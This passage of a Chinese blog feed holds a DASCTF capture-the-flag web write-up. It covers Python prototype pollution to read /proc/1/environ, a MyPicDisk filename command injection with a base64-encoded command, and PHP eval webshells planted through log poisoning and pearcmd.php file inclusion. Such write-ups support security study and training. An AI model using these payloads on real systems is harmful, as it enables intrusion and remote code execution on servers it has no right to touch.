class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>审计源码，存在标志性函数merge，为python类原型链污染，继续审计发现可利用函数open(‘’,’’).read()，构造json代码，修改<strong>FILE</strong>的数值为想要读取的内容，这里读取环境变量</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>: &#123;<span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/proc/1/environ&quot;</span>&#125;&#125;&#125;</span><br><span class="line"><span class="regexp">//</span>前面的username和password是为了绕过代码检查</span><br></pre></td></tr></table></figure><p>提交后经检查发现字符串<strong>init</strong>被过滤</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里可以使用unicode编码进行绕过</span><br><span class="line"><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;<span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span>&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br><span class="line">或者使用user类的check函数进行实例化绕过</span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;check&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">session_start</span>();</span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$size</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="language-php">    </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>MyPicDisk<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;form method=&quot;POST&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&#x27;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &#x27;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span></span><br><span class="line"><span class="language-php">          &#125;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>分析源码</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果不存在session[<span class="string">&#x27;user&#x27;</span>]，出现登录表单，提交表单之后就会给session[<span class="string">&#x27;user&#x27;</span>]进行赋值。</span><br><span class="line">第一次登录后再回到原表单就会触发js提示不是<span class="literal">admin</span>，并获得源码文件的位置，进入下一个if</span><br><span class="line"></span><br><span class="line">如果不存在<span class="keyword">file</span>，那就触发文件上传表单，action为index.php，如果存在上传文件，那么就对文件后缀进行判断并返回上传成功提示</span><br><span class="line">如果存在<span class="keyword">file</span>，那么就将文件名赋值给<span class="variable">$filename</span>，然后引用<span class="keyword">FILE</span>类对文件名进行处理，construct主要是过滤了/和多个.，且判断了文件是否存在，如果文件存在，那么就执行<span class="params">system</span>函数</span><br></pre></td></tr></table></figure><p>具体操作<img src="../笔记图/image-20230722205634843.png" alt=""></p><p><img src="../笔记图/image-20230722205650142.png" alt="image-20230722205650142"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://2f3204e1-d884-4172-86aa-0ac751e580de.node4.buuoj.cn:81/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">写表单进行登录和文件上传，上传文件之后再用另一个界面进行<span class="built_in">get</span>传<span class="built_in">file</span>，传入的<span class="built_in">file</span>名必须和上传的文件名是一样的，进而触发<span class="keyword">system</span>命令执行。</span><br><span class="line">由于对/和.具有严格过滤，所以这里采用编码绕过</span><br><span class="line">;`echo Y2F0IC9hZGoq | base64 -d`;.jpg</span><br><span class="line">bp传参需要把空格改为+号</span><br></pre></td></tr></table></figure><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看到是个网页直接盲猜一手后台管理界面/admin，然后弱口令试了一下就进去了</span><br></pre></td></tr></table></figure><p><img src="../笔记图/image-20230722211756542.png" alt="image-20230722211756542"></p><p>这里是有一个任意文件读取漏洞，but好像没什么卵用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">然后就想是否可以进行日志包含</span><br><span class="line">添加UA：<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[chuling]); <span class="meta">?&gt;</span></span><br><span class="line">然后访问url:   url/admin/r=../../../../../../<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">用蚁剑尝试连接，结果失败了。</span><br></pre></td></tr></table></figure><p>这时候就又来了一个pearcmd.php文件包含</p><p>参考博客：<a href="https://blog.csdn.net/Mrs_H/article/details/122386511">https://blog.csdn.net/Mrs_H/article/details/122386511</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">具体操作为?+config-create+<span class="regexp">/&amp;r=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/share/</span>php<span class="regexp">/pearcmd&amp;/</span>&lt;?=eval(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);?&gt;+<span class="regexp">/tmp/</span>chuling2.php</span><br><span class="line"></span><br><span class="line">成功之后直接蚁剑连接得到flag</span><br></pre></td></tr></table></figure><p><img src="../笔记图/image-20230722214619617.png" alt="image-20230722214619617"></p>]]></content>
    
    
    <summary type="html">DASCTF wp来咯~ web 3/5</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="比赛WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
</feed>
